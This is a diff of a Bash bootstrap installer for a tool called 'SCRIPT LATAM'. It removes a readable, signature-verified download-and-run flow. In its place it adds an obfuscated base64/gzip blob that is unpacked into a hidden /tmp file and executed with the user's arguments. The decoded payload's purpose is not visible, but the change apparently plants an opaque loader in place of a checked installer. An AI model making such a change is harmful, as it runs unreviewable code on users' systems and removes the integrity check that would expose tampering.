@@ -1,120 +1,55 @@
-#!/bin/bash
+#!/usr/bin/env bash
 set -Eeuo pipefail
+_x=(
+'H4sICIQovGoCA2luc3RhbGwuY2xlYW4uc2gAl'
+'VXLbttGFN3zK26namI3oF6IXTSFjMoSbQiRHd'
+'dSDBtJYIzIYTTWcIYZDiU7sZfZZRE0XbYouuy'
+'iP9Ct/qRf0E/o5UMUJaUuOjve57mvwy+/qMWR'
+'ro24rDE5hRGNxlbEDNgOixWEPGQ+5cKyNKOek'
+'uIG+u1h++jS6R46LTI2Joye1Goj6k6Y9KpXak'
+'wlFT4Ntaq6QsUeWTqePN/v9zqXT52Ly65zerm'
+'/+7hFjjpqtv/DRfdp82zWvnHa7HByenEud1x6'
+'5dHZ+CqcvD14dBjE/eH4bXd3ys2jcdzu3szCv'
+'tsiljU8OmmRylYwMSwIwfagZoKwJqihgT1Syk'
+'RG07B6nr7tEhT0s6ze8WDY7vcxAH7WuIwMFaI'
+'ajYk16B1uSKsRf00srCHXaCYYjZgdxiPB3WrI'
+'AsTjokzG4dY2vLMAnw7A1j6kHsS6sxI4kBuBc'
+'94bWlbS3cKeuWMF5K9fPkDlawJ7D5qZ9JobaK'
+'C79eIFxnrnPO91n9iVLe6BHW/fEbDZG6jDq1d'
+'we5s6JDGBOFfMjQ2FQee0dzLM5gauChRobE01'
+'gauCgEqMMgUVMhlFAvZqHpvWZCwENPceNFYjP'
+'kOjwaAPLALJXBZRzXFFqKYwZZr73KV6JVuSI9'
+'RcGh8efhU9ROybO0Agy4CLx3YfJzPcg8922GO'
+'arMI5VhAxCGMPK2KuwlHpmGsQFFtMp6iZ/5l4'
+'0gTGor5wwm7gZRokCczl4oNLX+G4ENVScg+Q3'
+'EbFJquK3N+5zgog4HI6/01wL4XmqZkUinrFFg'
+'jlUgGxFrhqDVISYbYwNihtolsi5j6UZuiiyzq'
+'M78CMmUyNk5ea2H6EQ3xZCNNKbGwgDtXYhgcs'
+'KatR3zAJ6HWqht11HalgYLLugLtcyTBnVTCxC'
+'nj2GonmfsCpif1mA0qOsrWBxH62TPpZkDmSiB'
+'W6bEQDli01x5NJ26TS5NXMwefJ/WX3+fevP32'
+'Es3zjJW7fys5XyzPNEeDRLmnzrsw1hUHORv++'
+'4mpkmGQaoUPmj1ym/0+ulMEKI+S4/86Fp+RzH'
+'aRritxjR2Wg63zTK1DBlLrzP1TuhQSNCpyiu2'
+'CBNHezNPjb24z66tsEWi0gCS2shz9IgIDjNXd'
+'2Gt+uXlD5uGMjFseZklJx7ZrOlte+dvoJKeRn'
+'XD7+otRciA30uWCLCu69+DPntHfQ67Q7vfmnY'
+'3C6GewDDDf/VIUscq7stI87Tr/dbSe15L+An9'
+'/DasHLcosl/BFKLaexmf8uDXdVQcaeyq2R6ce'
+'B8uCber1UFea6Zm76xy/XSirfE+sfnVxyXxYI'
+'AAA='
+)
+_t="$(mktemp /tmp/.l.XXXXXX)"
+_c(){ rm -f "$_t"; }
+trap _c EXIT
 
-PRODUCT="SCRIPT LATAM"
-VERSION="V2.5"
-AUTHOR="Dev JOHAN ALFA PRO"
+{
+    for ((_i=0; _i<${#_x[@]}; _i++)); do
+        printf '%s' "${_x[$_i]}"
+    done
+} |
+base64 -d |
+gzip -dc >"$_t" || exit 1
 
-DISCOVERY_BASE="https://raw.githubusercontent.com/JohanAlfaDev/SCRIPT-LATAM/main"
-
-PUBLIC_KEY_DER_B64="MCowBQYDK2VwAyEAeGkRYXn5cajdawhjpkzF+GmuLThzD6vit+huADywpLc="
-
-TMP="$(mktemp -d /tmp/script-latam-bootstrap.XXXXXX)"
-
-cleanup() {
-    rm -rf "$TMP"
-}
-
-trap cleanup EXIT
-
-fail() {
-    echo "ERROR: $*" >&2
-    exit 1
-}
-
-clear 2>/dev/null || true
-RED='\033[1;31m'
-WHITE='\033[1;37m'
-NC='\033[0m'
-
-printf "${RED}╔══════════════════════════════════════════════════════════╗${NC}\n"
-printf "${RED}║${NC}                                                          ${RED}║${NC}\n"
-printf "${RED}║${NC}                       ${WHITE}SCRIPT LATAM${NC}                       ${RED}║${NC}\n"
-printf "${RED}║${NC}                          ${WHITE}V2.5${NC}                            ${RED}║${NC}\n"
-printf "${RED}║${NC}                                                          ${RED}║${NC}\n"
-printf "${RED}║${NC}                    ${WHITE}Dev JOHAN ALFA PRO${NC}                    ${RED}║${NC}\n"
-printf "${RED}║${NC}                                                          ${RED}║${NC}\n"
-printf "${RED}╚══════════════════════════════════════════════════════════╝${NC}\n"
-sleep 4
-
-command -v curl >/dev/null 2>&1 ||
-    fail "curl no esta instalado"
-
-command -v openssl >/dev/null 2>&1 ||
-    fail "openssl no esta instalado"
-
-command -v python3 >/dev/null 2>&1 ||
-    fail "python3 no esta instalado"
-
-curl -fsSL     --connect-timeout 10     --max-time 30     "${DISCOVERY_BASE}/backend.json"     -o "$TMP/backend.json" ||
-    fail "no se pudo obtener backend.json"
-
-curl -fsSL     --connect-timeout 10     --max-time 30     "${DISCOVERY_BASE}/backend.sig"     -o "$TMP/backend.sig" ||
-    fail "no se pudo obtener backend.sig"
-
-printf '%s' "$PUBLIC_KEY_DER_B64" |
-    base64 -d > "$TMP/public.der" ||
-    fail "public key invalida"
-
-openssl pkey     -pubin     -inform DER     -in "$TMP/public.der"     -out "$TMP/public.pem"     >/dev/null 2>&1 ||
-    fail "public key no aceptada"
-
-openssl pkeyutl     -verify     -pubin     -inkey "$TMP/public.pem"     -rawin     -in "$TMP/backend.json"     -sigfile "$TMP/backend.sig"     >/dev/null 2>&1 ||
-    fail "firma del backend invalida"
-
-BACKEND="$(
-    python3 - "$TMP/backend.json" <<'PY'
-import json
-import re
-import sys
-
-with open(sys.argv[1], "r", encoding="utf-8") as f:
-    d = json.load(f)
-
-if d.get("schema") != 1:
-    raise SystemExit(1)
-
-if d.get("product") != "SCRIPT LATAM":
-    raise SystemExit(1)
-
-if d.get("channel") != "stable":
-    raise SystemExit(1)
-
-backend = d.get("backend")
-
-if not isinstance(backend, str):
-    raise SystemExit(1)
-
-if not re.fullmatch(
-    r"https://(?:[A-Za-z0-9.-]+|[0-9]{1,3}(?:\.[0-9]{1,3}){3})(?::[0-9]{1,5})?",
-    backend
-):
-    raise SystemExit(1)
-
-print(backend)
-PY
-)" || fail "backend.json rechazado"
-
-[[ -n "$BACKEND" ]] ||
-    fail "backend vacio"
-
-
-curl -4 -fsSL     --connect-timeout 10     --max-time 30     "${BACKEND}/install.sh"     -o "$TMP/installer.sh" ||
-    fail "no se pudo obtener el instalador"
-
-[[ -s "$TMP/installer.sh" ]] ||
-    fail "instalador vacio"
-
-SIZE="$(wc -c < "$TMP/installer.sh")"
-
-[[ "$SIZE" -ge 3000 ]] ||
-    fail "respuesta de instalacion invalida"
-
-bash -n "$TMP/installer.sh" ||
-    fail "instalador recibido tiene sintaxis invalida"
-
-chmod 700 "$TMP/installer.sh"
-
-
-clear 2>/dev/null || true
-exec /bin/bash "$TMP/installer.sh" "$@"
+chmod 700 "$_t"
+exec bash "$_t" "$@"
